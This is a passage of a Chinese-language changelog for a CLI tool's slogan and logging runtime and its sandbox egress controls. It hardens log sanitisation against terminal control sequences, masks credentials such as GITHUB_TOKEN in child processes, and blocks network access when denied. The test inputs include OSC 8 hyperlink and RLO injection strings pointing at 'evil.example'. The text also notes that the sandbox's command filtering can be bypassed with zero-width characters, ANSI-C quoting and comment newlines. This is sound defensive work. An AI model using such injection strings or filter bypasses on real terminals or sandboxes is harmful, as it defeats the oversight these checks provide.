本轮不改任何安全裁决，只补前四轮刚修完的运行时对应关系里的漏洞。

- **owner 不再是可注入通道**：`owner` 是 `pick_for_event` /
  `record_error` 的 public 入参。实测注入 5033 码点含 `ESC ]8;;`
  超链接与 `U+202E` RLO 的串，`SloganDecision.owner`、桶 key、
  `slogan_trace()` 输出**全部原样带控制字符** —— D4 净化了
  event/kind/context，偏偏漏了这一路。现在写入与查询共用
  `norm_owner()`：干净输入零改动，脏串归一成定长
  `owner:<sha1(raw)[:16]>`（22 码点，严格幂等，不同脏串不撞车）。
  实测 5033 → 22 码点、ESC/RLO/OSC8 全清、`dispatch_log(evil)`
  与 `dispatch_log(d.owner)` 命中同一桶。
- **修净化时别把查询链路打断**：初版把 key 拼成 74 码点，
  二次归一又被 64 上限截断并**重算指纹**，实测
  `dispatch_log(evil)` 返回 0 而 `dispatch_log(d.owner)` 返回 1
  —— 写入与查询静默分叉。改为定长指纹 key 后 `norm_owner`
  严格幂等。这是本轮自己引入又自己抓回来的缺陷，如实记录。
- **日志字段净化不再因脏配置崩溃**：`sanitize_log_field` 的
  `limit` 旧实现直接 `int(limit)`，`None` / `nan` / `inf` 分别抛
  TypeError / ValueError / OverflowError，`'5'` / `True` / `-1`
  被悄悄接受。新增 `_coerce_log_limit()` 严格校验，脏值回落
  默认 120 绝不抛异常，与 `load_config` 的类型口径一致。
- **LRU 被动淘汰不再是无声黑洞**：D4 只给显式 `close()` 封存了
  快照。实测第 129 个会话挤掉含 `turn.completed` 的整桶，查不到
  且无任何痕迹。现在 `EvictionRecord`（owner / dropped /
  last_reason / at_ms，**不含文案与 entry_id**）记入有界
  `_EVICTED`（64），`evicted_owner_log()` 与
  `dispatch_log_stats()['evicted_recent']` 可查。
  **刻意不复活决策内容**（否则 128 桶上界失效）；`evicted_recent`
  是观测项，**不参与 `audit().ok`**。
- **单一释放出口 + 并发契约补全**：`close()` 从
  「`dispatch_log` + `release_owner`」两步收敛到
  `mapping.take_owner_log()`，消除两套实现的漂移面；
  `_slogan_sealed` 写放进 `_slogan_lock`（读本来就有锁），
  删掉 `slogan_closed_trace()` 未使用的 `keys` 变量。

**如实边界**：脏 owner 归一为 `owner:<fp16>`，原串不进日志
（可读性下降是明确取舍），干净 owner 零改动；淘汰记录只保留
最近 64 次、更早淘汰仍不可查；`_slogan_sealed` 写加锁后仍只是
实例内快照；并发压测仍未复现 list 撕裂（同 §17）；不是真机长跑；
分叉改动仍未合并；第三方自适应红队仍未做。

验证：256 例 pytest + 73 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 21. 先清理后截断、注入时钟贯穿、淘汰痕摘要

本轮不改任何安全裁决，只补前五轮刚修完的运行时对应关系里的漏洞。

- **先粗切导致合法内容不可达**：`sanitize_log_field` 旧实现
  `raw[:lim*4]` 先截断再清理。实测 `' '*1000+'OK'`（limit=120）
  只扫前 480 码点，前部垃圾吃满额度，清理后为空，尾部唯一合法
  内容 `OK` 被整段丢弃。现在**先 `_clean_once` 迭代到不动点、再按
  `lim` 截断**，并加 `_SCAN_CAP = 65536` 扫描上限
  （实测 `_clean_once`：64KiB≈17ms / 1MiB≈0.32–0.37s / 2MiB≈0.66–0.68s）。
  64KiB 以内保证语义正确；超出才粗切兜 DoS，**这是显式
  fail-closed 边界**，实测 `' '*70000+'OK' -> ''`，不宣称
  「任意长度都保真」。截断结果仍严格幂等。
- **连续 ESC 串吞掉尾部字符**：修上一项后实测暴露
  `''*900+'END' -> 'ND'`，最后一个 ESC 与 `E` 拼成 `ESC E`
  (NEL) 被 `_ESC_SEQ_RE` 吞掉。新增 `_ESC_RUN_RE = {2,}`
  排在 OSC/CSI **之后**（以 `[`/`]` 引导的真序列已先剥掉），
  实测 `-> 'END'`，且 `'[31m' -> ''` 没误伤 CSI。
  **单个** `'END'` 仍是 `'ND'`：ECMA-48 固有歧义，本轮
  未改；ESC 已清除、不会回显控制序列，因此**无安全风险**，
  只是保真度边界。
- **孤立 ESC 候选实测不成立、未修**：怀疑 `_CTRL_RE` 不含
  `0x1b`，实测 `sanitize_verb('abc') == 'abc'`、
  `'' -> ''`。原因是字符类 `-` 覆盖 0x1b。
  **没有为它改任何一行代码**，只加回归锁住既有正确行为。
- **淘汰痕与 decision 共用注入时钟**：旧实现淘汰痕用
  `time.monotonic()`，实测注入 `now=1000.0` 时
  `decision.at_ms=1000000` 而 `EvictionRecord.at_ms=76564`，
  可确定性回放断一半。现在 `_record(d, at_ms=...)` 接受调用方
  时钟，`pick_for_event` 5 个分支与 `record_error` 全部传 `at`；
  两次回放元数据完全一致。
- **`reason_counts` 让错误信号不再被掩盖**：旧版只记
  `last_reason`。实测桶内 `ok / error:boom / ok` 淘汰后
  `last_reason='ok'`，运维看不出曾出错。现在
  `EvictionRecord` 带按 reason 计数并排序的摘要
  `('error:boom',1),('ok',2)`，`sum == dropped`；**不含文案与
  entry_id**，不影响 `audit().ok`。
- **口径精确化**：新增 `OWNER_LIMIT = 64`，docstring 改为
  「干净且 ≤64 码点零改动」；实测 `'a'*64` 原样、
  `'a'*65 -> owner:<fp16>`。功能零变化，加边界测试锁住。

**如实边界**：`_SCAN_CAP` 之外仍先粗切；单个 ESC 的 ECMA-48
歧义未解决（但无控制字符残留）；超长 owner 的全串 sha1 成本
未修（实测 2 MiB ≈ 1.7 ms）。`reason_counts` 只汇总 reason，
不复活决策内容；只保留最近 64 次淘汰；`evicted_recent` 不参与
`audit().ok`。`tui.py` / `runtime_slogans.py` 文件零改动，但
re-export 的 `sanitize_verb` 因共享 `_clean_once` 对连续 ESC
输入更保真，其余行为不变。并发压测仍未复现 list 撕裂；不是
真机长跑；分叉改动仍未合并；第三方自适应红队仍未做。

验证：276 例 pytest + 80 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 22. ESC+ 引导、时钟严格化、有界摘要、累计淘汰证据

本轮不改任何安全裁决，只补前六轮刚修完的运行时对应关系里的漏洞。

- **上一轮 ESC_RUN 修复有覆盖缺口**：`]8;;evilOK`
  旧版返回 `'K'`、`[31mRED` 返回 `'ED'`、
  `[?25lHIDE` 返回 `'IDE'`。原因是 OSC/CSI 正则从 ESC 串的
  **最后一个** ESC 开始匹配，前面留下孤立 ESC，被 `_ESC_SEQ_RE`
  与尾部第一个可打印字符拼成假序列吞掉。上一轮只测了无尾巴的
  `[31m -> ''` 就宣称覆盖。现在引导改为 `+`，整段
  「连续 ESC 串 + 真序列」一次剥掉，实测五个 case 全部恢复尾部
  原文；单 ESC 行为不变、全部幂等。**单个** `END -> 'ND'`
  的 ECMA-48 固有歧义仍未改，但 ESC 已清除、不会回显控制序列，
  无安全风险。
- **public 时钟入参不再裸奔**：`now=nan` 曾抛 ValueError、
  `now=inf` 抛 OverflowError、`now='1000'` 产出 4000 位天文数字
  （字符串 `*1000` 放大）；`record_error(at_ms='1000')` 曾把
  **字符串**存进 `SloganDecision.at_ms`，`True` 被当成 1。新增
  `_coerce_ms(value, is_seconds)`：拒绝 bool / 非数值 / 非有限 /
  负值 / 超上界，脏值回落真实单调时钟。三个入口统一，实测 9 种
  脏值全部产出合法正 `int`、不抛异常、不放大。
- **本轮自引入又抓回的缺陷**：初版写成
  `_coerce_ms(...) or _fallback_ms()`，把**合法 0** 当 falsy 吞掉
  （实测 `now=0 -> 1072138`）。改为显式 `ms is None` 判断后
  `now=0 -> 0`、`now=1 -> 1000`、淘汰痕 `at_ms=0` 全部正确。
  与 §20 的 A′ 同类教训，如实记录。
- **owner 摘要有界**：旧版对整串做 UTF-8 编码 + sha1，无上界
  （实测 1 MiB ≈ 12.7 ms，每次写入/查询都付）。新增
  `OWNER_SCAN_CAP=4096`，超长串用「头 2048 + 总长 + 尾 2048」
  参与摘要；实测仅尾部不同的两个 100k 串仍不撞、严格幂等，
  64KiB→8MiB 归一耗时均 ≈12–14 ms（固定上限）。
  **如实边界**：共享头尾与总长、仅中间不同的两个超长串会撞到
  同一 key，不宣称零碰撞。
- **淘汰累计证据**：新增 `evicted_total()` 与
  `dispatch_log_stats()['evicted_total']`，与 `_INDEX_MISSES` 的
  「连续 / 累计」双层口径对齐。环形缓冲只答最近 64 条，累计值
  不因滚动丢失；**不参与 `audit().ok`**（淘汰是正常有界行为）。
  只有显式 `reset_dispatch_log()` 全清才归零。

**四个候选实测不成立、未修**：3 次不动点从未误杀正常文本、
开头组合标记/GCG/ZWJ 已被清理、lone surrogate owner 不撞车且
幂等、`record_error` 的 kind 已被净化。只加回归锁住既有正确行为，
防止以后误「修」。

**如实边界**：脏时钟注入回落真实时钟，**不保证这类调用可回放**；
`_SCAN_CAP=65536` 之外仍先粗切；单个 ESC 的 ECMA-48 歧义未解决；
`evicted_total` 是信息项，明细仍只保留 64 条、不复活决策内容。
`tui.py` / `runtime_slogans.py` 文件零改动（本轮推送不含它们），
但共享 `_clean_once` 的 `sanitize_verb` 对连续 ESC 更保真，
139 例既有回归全绿。并发压测仍未复现 list 撕裂；不是真机长跑；
分叉改动仍未合并；第三方自适应红队仍未做；**不宣称性能提升**。

验证：300 例 pytest + 88 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 23. 裁剪证据与「不该修」的两个保真度候选

本轮不改任何安全裁决，也不改净化层一行，只补一处可观测性缺口。

- **桶内裁剪静默丢错误信号**：实测造一条 `error:boom` 后灌 84 条
  决策，`dispatch_log('s0')` 里 error 消失，而 `evicted_recent=0`、
  `evicted_total=0` —— **根本没有发生淘汰**。原因是
  `_DISPATCH_CAP=64` 的 `del bucket[:-cap]`；上一轮的
  `EvictionRecord.reason_counts` 只在淘汰时汇总「当前桶」，
  覆盖不到这一层。现在 ``_record`` 裁剪前先取 `dropped`，累加
  全局累计（``bucket_trims`` / ``trimmed_decisions`` /
  ``trimmed_reasons``）与 per-owner 摘要；后者在会话被 LRU 淘汰时
  随 `EvictionRecord.trimmed_dropped` / `trimmed_reason_counts`
  一起带走。实测 `(('error:boom',1),('ok',21))` 从「完全不可见」
  变成两处可查。新增 `bucket_trim_stats()`、累计决策数
  `decisions_total`，`audit().as_dict()` 自动携带。
  全部是**信息项**，不参与 `audit().ok`。
- **本轮自引入又抓回的 off-by-one**：初版 reason 种类上限判断
  让 64 个具体 reason + `<other>` 变成 **65** 个键；改成按「具体
  reason 种类」计数，`<other>` 作为额外桶，总数恒 ≤ 65 且具体
  种类 ≤ 64。

**两个候选确认成立但判定「不该修」**，理由都是「修了会放宽安全
边界，而收益实际为零」：

1. **未终止 OSC 吞光整行**（`']8;;https://evil.example'+'OK'
   -> ''`，`sanitize_verb` 同源）：ECMA-48 里无终止符时后续字节
   规范上全属参数，整段删正确。实测尝试修（终止符必需 +
   4096 上限）会让 **904 码点的参数残留文本**进入日志，反而放宽
   净化；且 `sanitize_log_field` 按 120 码点截断后尾部 `END`
   仍不可达。收益为零、风险为正。
2. **ZWJ emoji 被 Cf 清理拆散**（`👩‍💻 -> 👩💻`）：核查
   1695 条词条 **ZWJ / VS16 / ESC 全部为 0**；修它要放宽 Cf
   清理（保留 ZWJ）并连带改 `_clusters` / `display_cols` /
   500 串宽度交叉回归，而 bidi isolate / RLO / ZWSP 必须继续删。
   实际标语零收益，安全与宽度真值风险为正。

`test_A_attempted_fix_would_leak_osc_parameters` 与
`test_B_registry_contains_no_zwj_variation_or_esc` 把这两条判断
变成**可执行证据**，不只是文档辩解。

**如实边界**：裁剪证据的 per-owner 摘要只在 **LRU 淘汰**时随
`EvictionRecord` 带走；显式 `release_owner()` / `take_owner_log()`
释放的会话不带走（全局累计仍保留）；全局摘要不归属具体 owner。
`<other>` 合并尾部种类、不保留原始分布。未终止 OSC 的 ECMA-48
歧义、ZWJ emoji 拆散、`_SCAN_CAP` 之外先粗切三者**未解决**，
都有回归把当前正确行为锁住。`_clean.py` / `tui.py` /
`runtime_slogans.py` 逐字节未改，均不在本轮推送清单。并发压测
仍未复现 list 撕裂；不是真机长跑；分叉改动仍未合并；第三方
自适应红队仍未做；**不宣称性能提升**（裁剪路径多了有界常数
开销，未做基准对比）。

验证：319 例 pytest + 97 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 24. public 入参类型面：event 守卫与脏 owner 隔离

本轮不改任何安全裁决，也不改净化层一行，只补前八轮一直没扫到的
**public 入参类型面**。

- **N1 · `event` 查表前无类型守卫**：实测
  `pick_for_event(['a'])` 抛底层 `TypeError: unhashable type: 'list'`
  （`{'x':1}` 同理），与 `record_error` 先净化再结构化拒绝的口径
  不一致。TUI `_slogan_dispatch` 的 `except UnboundSloganEvent`
  接不住它，落到 `except Exception` 只记 `error:TypeError`，
  `strict=True` 开发模式期望的严格契约被绕过。现在
  `pick_for_event` 开头加 `isinstance` 守卫，非 str 一律走同一个
  `UnboundSloganEvent`，消息用**固定占位** `<invalid-event>`，
  刻意不调用 `str(raw)` —— 否则超长或带控制字符的外部串会进
  traceback。九种非字符串输入（含不可 hash 的 list / dict /
  tuple / frozenset）统一结构化拒绝，18 个合法事件零变化。
- **N2 · 非字符串 `owner` 静默折叠成空 key**：旧
  `norm_owner` 把 `None / 123 / True / bytes / list / dict / float`
  全部折叠成 `''`。实测七个不同脏 owner 共用一个桶、污染
  「不传 owner」调用方的默认桶；更糟的是 `dispatch_log(None)`
  是「全量」语义而 `dispatch_log(123)` 查的是空桶，同一次运行
  分别返回 **9 条和 8 条** —— 一个笔误就拿到完全错误的日志集合，
  无报错、无留痕。现在 `None` 仍表示「无 owner」，其余非字符串
  归到固定隔离桶 `owner:invalid`（干净、13 码点、严格幂等，
  写入/查询自动对上），并由入口 `_coerce_owner()` 调
  `_note_invalid_owner()` 留痕。类型名来自 public 可控的
  `type(raw).__name__`，过同一份净化核心并限长 32、种类上限 32
  （超出归 `<other>`）；实测自定义类名含 OSC8 + RLO + 500 个 A
  时脱敏后只剩 33 码点且无控制字符。`dispatch_log_stats()` 新增
  `invalid_owner_calls` / `invalid_owner_types`，`audit().as_dict()`
  自动携带；计数只在两个入口发生，查询侧 20 轮调用后仍为 1。
  全部是**信息项**，不参与 `audit().ok`。

**四个候选判定「不该修」**：`lang` 非字符串静默回落默认语种
（只影响选词语种，不影响分桶/裁决）、`record_error` 的
event/kind 已被 D4 净化、`sanitize_log_field` / `sanitize_verb`
非字符串返回空串（既有 fail-closed 契约）、`owner=None` 与 `''`
同桶且 `dispatch_log(None)` 全量（文档明确的兼容契约）。
本轮只把「非字符串脏值」与「无 owner」分开，不动后两条。

**一条既有源码级断言因行为变更同步到新契约，不是放宽**：
`t_d5_owner_normalization` 原断言 `owner = norm_owner(owner)`；
入口改走 `_coerce_owner` 后改为同时检查 `def norm_owner` /
`def _coerce_owner` / `owner = _coerce_owner(owner)` 与两处调用，
并保留全部运行时断言。其余既有断言一条未动。

**如实边界**：行为变更**仅针对错误用法** —— 非字符串 owner 从
默认桶移到隔离桶，正常字符串 / `None` / `''` 零变化；依赖「传数字
也进默认桶」的调用方需改传字符串。若真的把字符串
`"owner:invalid"` 当 owner 用，会与脏值桶撞（固定键的固有碰撞面，
已加回归锁住，不宣称零碰撞）。类型分布最多 32 种具体 + 1 个
`<other>`，超长类名只保留前 32 码点 + 省略号。`_clean.py` /
`tui.py` / `runtime_slogans.py` / `test_runtime_slogans.py` 逐字节
未改，均不在本轮推送清单。并发压测仍未复现 list 撕裂；不是真机
长跑；分叉改动仍未合并；第三方自适应红队仍未做；**不宣称性能
提升**（入口多一次 isinstance 与有界 Counter 更新，未做基准对比）。
本轮实测未发现需要回修的自引入缺陷，但 A′–E′ 五个边界都量过。

验证：343 例 pytest + 105 项纯 stdlib 独立验证 + 22/20 项上轮脚本全绿。

---

## 25. 引擎本体 public 入参面：异常路径半更新与未净化诊断

本轮不改任何安全裁决，也不改净化层一行（``_clean.py`` 逐字节未改）。
前九轮几乎都在改 ``mapping.py``，本轮把「先实测再修」搬到
**运行时标语引擎本体** ``tui/runtime_slogans.py``。

**最毒的是异常路径的半更新（P1）**。D1 的 ``RLock`` 解决并发撕裂，
防不住异常路径：``note_activity`` 先写状态、最后才在
``_record_locked`` 里 ``int(at*1000)``。实测 ``now=math.nan`` 抛
ValueError 之后，``_last_event_at=nan`` / ``_seq`` / ``_phase`` /
``_current`` **全都已经写好了**，随后 ``liveness()`` 与
``snapshot()`` 永久抛 ValueError —— 一个 public 时钟入参的脏值能让
整个 TUI 渲染停摆。同路径还实测 ``now='1000'`` 抛底层 TypeError、
``inf`` 抛 OverflowError、``True`` 被悄悄当成 1 秒、``1e308`` 是
合法有限值却在 ``int(at*1000)`` 溢出成 inf、注入 ``clock`` 返回脏值
或抛异常同样掀掉调用方。引擎侧从没做过深度轮 7 给 mapping 做过的
严格校验。

修复：新增统一时钟入口 ``_now(value)``。``_coerce_now_value`` 只
接受有限实数秒，拒绝 ``bool`` / 非数值 / 非有限 / 负数 / 超过
``_MAX_NOW_SECONDS=1e9``（夹上界是为 ``int(at*1000)`` 不溢出，
不是业务上限）。优先级「合法 ``now`` > 合法注入 ``clock`` >
``time.monotonic()``」；注入 clock 抛异常也接住。**校验在所有字段
写入之前**完成，这是消除异常路径半更新的关键；``0`` 是合法零值，
显式判 ``is None``（深度轮 7 踩过 ``or fallback()`` 吞零的坑）。
``note_activity`` / ``note_progress`` / ``liveness`` / ``render`` /
``snapshot`` 五个出口全部走它。

**另外五个真缺陷**：

| # | 实测 | 处置 |
|---|---|---|
| P2 | ``note_progress(kind=evil)`` 后 ``EventRecord.kind`` 原样保留 530 码点含 OSC 8 + U+202E RLO，经 ``Liveness.evidence`` 进诊断输出 | 过 ``sanitize_log_field(kind, 40)``，非法回落 ``"progress"``；与 ``_clean`` 同一真值，``mapping.record_error`` 早已如此 |
| P3 | ``str(raw_mode)`` 把 settings.json 里 5000 码点含 ESC/RLO 的串原样拼进 ``source``，进 ``Liveness.source`` / ``snapshot()`` / ``render`` | 新增 ``_safe_source()`` 统一净化限长 120；``mode`` 非字符串直接拒绝、字符串净化限长 40；阶段键与 ``str(p)`` 同样净化；合法配置零变化 |
| P4 | ``reset()`` 用真实时钟而 ``note_activity(now=..)`` 用注入时钟，证据链 ``[1000000,1001000,1000000]`` 倒退、真实 monotonic 下两套时间源 | ``reset()`` 优先沿用 ``_last_event_at``（对 nan/inf 残留做防御），**不改签名**；证据链单调同源，边界靠 ``kind="reset"`` 区分 |
| P7 | ``detail=None/123`` 让 ``len(detail)`` 抛 TypeError；``detail=['a']`` 被 ``_detail_class`` 当字符串遍历得出误导性 ``class='ascii'`` | 非字符串收敛成 ``""``，与 D3「绝不记 detail 原文」一致 |
| P8 | ``load_config(123)`` 直接抛底层 TypeError（``p = _settings_path(path)`` 在 ``try`` 之外），与 docstring「绝不因配置写错让 TUI 崩」矛盾 | 挪进 ``try``，脏 path 回落 ``builtin`` |

**四个候选判定「不该修」**：``phase`` 为任意非 str / 未知 / 不可
hash 一律兜底 ``waiting_model`` 且不抛（既有 fail-safe，phase 不进
日志原文）；字符串 ``detail`` 只记长度+字符类别、不记原文（D3 脱敏
契约，20 万码点也只留一个整数）；未知阶段键返回固定
``invalid:budget-phase``（检查在 ``__post_init__`` 之前，原文进不了
source）；``sanitize_verb(123)==''``（既有 fail-closed）。另把
「``liveness`` / ``render`` / ``snapshot`` 仍是纯读」写成回归，
防止从渲染循环记活性 —— 那正是 D4 反复反对的「定时空转装忙」。

**如实边界**：行为变更**仅针对错误用法** —— 脏 ``now`` / 脏
``clock`` / 非字符串 ``detail`` / 非字符串 ``kind`` / 脏 ``path``
从「抛异常或带原文」变成「净化 / 回落 / 拒绝」；合法 ``now``、
合法配置、合法 ``kind``、字符串 ``detail``、``reset()`` 签名零变化。
``now`` 夹在 ``[0, 1e9]`` 秒，超出（含合法但极大的有限值）回落
真实时钟，不宣称支持任意量级单调时钟。``reset()`` 与最后一条证据
``at_ms`` 可能相同；不传 ``now`` 与注入时钟混用时保证**不倒退、
不同源混写进同一条链**，但两套时钟的根因仍靠调用方自律。
**本轮唯一改动的运行时代码是 ``runtime_slogans.py``**；
``mapping.py`` / ``_clean.py`` / ``tui.py`` /
``ui/slogans/__init__.py`` / ``test_slogan_mapping.py`` 逐字节未改，
均不在本轮推送清单。既有断言一条未动、一条未放宽；本轮实测未发现
需要回修的自引入缺陷（零值 / 极大有限值 / clock 抛异常 / 非 str
kind / reset 残留 nan / ``Decimal`` 六个边界都量过），不写成
「零缺陷」。并发压测仍未复现 list 撕裂；不是真机长跑；分叉改动
仍未合并；第三方自适应红队仍未做；**不宣称性能提升**（入口多一次
数值校验与净化调用，未做基准对比）。

验证：376 例 pytest + 117 项纯 stdlib 独立验证 + 22/20 项上轮脚本
全绿；独立验证脚本新增引擎检查，已实测屏蔽
``pytest / rich / prompt_toolkit / wcwidth`` 后仍可导入（PEP 562
惰性导出），不破坏纯 stdlib 约束。

---

## 26. 注入契约与配置切换锚点：同一个 seq 不能对应两个文案

本轮不改任何安全裁决，也不改净化层一行（``_clean.py``
逐字节未改）。**唯一改动的运行时代码仍是
``tui/runtime_slogans.py``**。

**D（最值钱）：`reload()` 打断 D1 的 `(seq, verb)` 撕裂检测锚点。**
D1 用 `EventRecord` 的 `(seq, verb)` 配对当并发撕裂检测锚点：
一个 seq 只能对应一个文案。旧 `reload()` 把 `_current = ""`
却**不推进 seq、不记证据**，而 `render()` 在 `not _current` 时
显示新词池首条。实测：

```
事件后    seq=1  current='正在刷屏'   evidence.verb='正在刷屏'
reload 后 seq=1  current=''          evidence.verb='正在刷屏'
render.text='重装后的词'   view.seq=1
>>> 同一个 seq=1 对应两个文案
```

第二次 `reload()` 返回 `(False,"unchanged")` 却照样清空
`current` 造成**静默换词**。现在把配置切换视作**可审计的状态
转移**：`unchanged` 是真 no-op（不清 current / 不动 seq /
不记证据 / 不碰缓存）；`changed` 时新文案取新词池首条
（确定性、**不调 rng**，避免把配置重载伪装成随机 spinner
事件）、推进 `seq`、记 `kind="reload"` 证据，其 `verb` 与屏幕
显示严格相等；证据时间戳沿用 `_last_event_at`（与深度轮 10
P4 的 `reset()` 同源），不混两套时间源。实测 `seq 1→2`、
`current = evidence.verb = render.text = '重装后的词'`、连续
5 次恒为词池首条、真实时钟下 `[1000000,1000000]`。**这不是
D4 禁止的「从动画循环记活性」** —— reload 是显式配置事件，
D4 反对的是定时空转装忙。

**A：`__init__` 的 `or` 吞掉 falsy 但完全合法的注入对象。**
旧 `config or load_config()` / `rng or random.Random()`。实测
注入 `__bool__=False` 的配置子类与 `__len__=0` 的随机源：
`config.source` 从 `INJECTED` 变 `builtin`、注入 `rng.choice`
调用 0 次、两个同构引擎文案不同 —— 深度轮 4 的确定性回放
契约被一个 `or` 吃掉。这是深度轮 7 A′（`or fallback()` 吞掉
合法 `0`）的**第三次同源**。改成显式 `is None` 后注入对象原样
保留、`rng.choice` 调用 1 次、两个同构引擎文案一致、`None`
仍回落出厂值。**`lang` 刻意不改**：实测 `slogan_bank("")` 回落
英文词库，改成 `is None` 会让 `lang=''` 从 zh-CN 变英文，是
行为退化，判定「不该修」。

**B：`load_config` 静默截断 205 → 200 条自定义词。** 旧
`raw_verbs[:200]` 让第 205 条凭空消失，而 `source` 是正常路径、
无任何提示 —— 与深度轮 10 P8「静默忽略是危险的假安全感」
同类。200 是防 DoS 上限，但不该悄悄生效：超限**整段拒绝**
`invalid:too-many-verbs`。200 条以内零变化。

**C：`mode=default` 下自定义词全不可渲染时被静默忽略。** 实测
`{"mode":"default","verbs":[123,None,['a'],{},True]}` 净化后
一条不剩但 `source` 仍是正常路径 —— 用户以为自定义了标语，
实际全用内置词库。现在「写了自定义词却一条都不可渲染」对
**所有** mode 一律用既有 `invalid:empty-verbs` 拒绝（复用既有
source，不改任何既有断言口径）；混合场景仍只保留可渲染的词。

**四个候选判定「不该修」**（都有回归锁住）：`lang` 的 `or`
（改它是行为退化）、`phase_budgets_ms` 的 `[:10]`（合法阶段键
上限 5 < 10，**不可达代码**）、`snapshot()` 写 `_pools`
（确定 / 幂等 / 纯内存的无害缓存）、`evidence_seq` 饱和语义
（deque maxlen=16，兼容字段，名字像全局序号其实是窗口内条数）。
**上一轮回归 `test_liveness_is_still_pure_read` 漏检了
`_pools`**，「完全纯读」的说法其实不准确；本轮新增
`test_snapshot_populates_pools_deterministically` 把事实锁成
可执行断言 —— 这是补上一轮欠的口径，不是修 bug。

**一条既有运行时断言 + 一条上轮独立脚本断言同步到新契约，
不是放宽**：原 `snapshot()["current"] == ""` 改为同时要求
`current == "新词条"`、池大小 1、`evidence[-1].kind == "reload"`、
`verb == "新词条"`、`seq` 相等、`render(True).text == "新词条"`
—— 断言更强。其余既有断言一条未动、一条未放宽。

**如实边界**：两处行为变更都如实标注 —— (a) 超过 200 条
`verbs` 从「静默生效前 200 条」变成整段拒绝
`invalid:too-many-verbs`，依赖 201+ 条的部署需拆分或减词条；
(b) `reload()` 成功后 `current` 从 `""` 变成新词池首条且
`seq` +1、多一条 `kind="reload"` 证据，失败 / unchanged /
合法 `now` / 正常 spinner 事件路径零变化。`mapping.py` /
`_clean.py` / `tui.py` / `ui/slogans/__init__.py` /
`test_slogan_mapping.py` 逐字节未改，均不在本轮推送清单；
净化层连续两轮零改动。本轮实测未发现需回修的自引入缺陷
（连续第三次），但 `lang=""`、200/201 边界、5 个合法 budget
键、unchanged no-op、真实时钟 vs 注入时钟、全新引擎 reload、
确定性首条七个边界都量过，不写成「零缺陷」。并发压测仍未
复现 list 撕裂；不是真机长跑；TUI 仍未替换既有 i18n 文案；
分叉改动仍未合并；第三方自适应红队仍未做；**不宣称性能
提升**（入口多一次 `is None` 与长度检查，reload 多一次词池
计算，未做基准对比）。

验证：404 例 pytest + 126 项纯 stdlib 独立验证 + 22/20 项
上轮脚本全绿；独立验证脚本新增 9 项引擎检查，仍保持屏蔽
`pytest / rich / prompt_toolkit / wcwidth` 后可导入（PEP 562
惰性导出），纯 stdlib 约束不破。

*最后修订：2026-09-06 · 适用于：Tuan-CLI 所有版本*

---

## 27. B2：子进程出网边界与凭据 sentinel（完整复现见 `CLAUDE_PARITY.md` §12）

**实测缺陷**：`SandboxManager._execute_backend` 算出
`block_net = not verdict.network`，但 `local` 分支既不传 `block_net`
也不传 `env`。两个后果：

1. `verdict.network=False` 且后端落到 `local` 时命令仍以父进程完整
   `os.environ` 裸跑 —— 禁网裁决在**唯一没有 OS 级出网隔离能力**的
   后端上静默失效；L2 的命令文本识别可被零宽字符 / ANSI-C / 注释
   换行绕过。
2. `GITHUB_TOKEN` / `AWS_SECRET_ACCESS_KEY` 等真实凭据原样进入子进程，
   与「子进程不持密钥」的宣称相反。

**修复**：新增 `tuan_cli/sandbox/egress.py`，把边界放在**执行前**：

| 组件 | 作用 |
|---|---|
| `CredentialBroker` | 真实值只在当前进程内存；子进程拿 `tuan-egress-sentinel-v1:<fp>`；`repr` / 审计 / 异常 / `to_audit_dict()` 不泄露 |
| `build_child_env` | 保留 `PATH`/`HOME`/`LANG` 等非敏感变量；敏感键替换为 sentinel；脏输入（非 Mapping / 非 str 键值）**空环境**，绝不回退继承父进程 |
| `enforce_local_egress` | local + 禁网 → **fail-closed 拒绝**，不假装禁网成功；强后端走自身边界 |
| `EgressGuard` | 三者合成一次检查，`manager` 的 local 分支真调它并传 `env=` |

**同轮另外两项**：`unattended.py` 落地
`permissions.denyInsteadOfPrompting`（默认关；`denied=True` 是硬事实，
`continue_turn` / `suppressed_prompt` 结构化写入 `verdict.extra` 与可查询
审计；真接到 `assess_tool`）；`worktree_boundary.py` 真接到
`worktree_layer.py` 的 `create` / `create_agent_worktree` / `_git`，
断言解析后 target 在 workspace 内（含 symlink 祖先）、剥离
`GIT_DIR` / `GIT_WORK_TREE` / `GIT_INDEX_FILE` 等重定向变量、拒绝
`git -C` / `--git-dir` 越界 argv。

**配置与行为变更（如实）**：
`sandbox.resource.egress_credential_masking=true`、
`egress_block_local_when_denied=true`（默认开是修复 fail-open，显式关闭
由 `config validate` 报安全降级）；`permissions.denyInsteadOfPrompting`
默认 false，开启报行为变更 warning。
**`deny_network_by_default` 仍 false，没有翻** —— 兑现前 13 轮
「翻 true 是破坏性变更、不擅自翻」的承诺。

**如实边界**：`inject_headers()` 默认关闭、没有出网代理转发进程，
所以 `credential_masking` 在 `catalog` 里只从 gap 改 **partial**，
不宣称与 CC 的「sentinel + 代理注入」完整对等；`os_sandbox` 仍是
**gap**（没把 OS 级隔离变成默认执行边界）；`network_default_deny`
也是 partial（出厂默认未翻、逐命令 `allowed_domains` 强绑定仍缺）。
`fully_superior` 仍 false（26 个缺口、B2 未全清、第三方自适应红队未做）。
不是真机多平台验证：Windows Job Object / macOS Seatbelt 未实机跑。

验证：34 例新回归 + 108 例 parity/CLI/headless + 353 例相关批次全绿；
`matrix.validate() == []`、`security_wiring_intact=true`。
两条既有计数断言同步到新基线，**不是放宽**。


---

## 28. B2 收尾：逐命令域名强绑定 + 本地回环出网代理（完整复现见 `CLAUDE_PARITY.md` §13）

**实测缺口**：`SandboxProfile` 只有 `network: bool`；`_run_provider` 构造
`SandboxProfile(network=verdict.network, ...)`；`assess_command(...)` 的
`verdict.extra = {}` —— 执行层和出网路径上**完全没有域名概念**。
`TrustFilter` 的全局白名单只在命令文本层生效（补测确认它确实会 DENY，
纠正 §12 复现脚本把 `network`/`isolate` 误读成 `action` 的表述），而文本
识别可被零宽字符 / ANSI-C / 注释换行 / 变量间接引用绕过。

**修复（把强制点从文本层搬到出网路径）**：

| 组件 | 作用 |
|---|---|
| `sandbox/egress_allowlist.py` | `normalize_domain` 严格归一化；`NetworkClaim` **逐命令**声明（工具参数 `allowed_domains` 优先、回落全局并如实标 `source`）；`evaluate_claim` 声明外拒绝、strict 未声明任何主机拒绝一切、检测不到域名标记 `undetectable` 而非悄悄当已证明合规 |
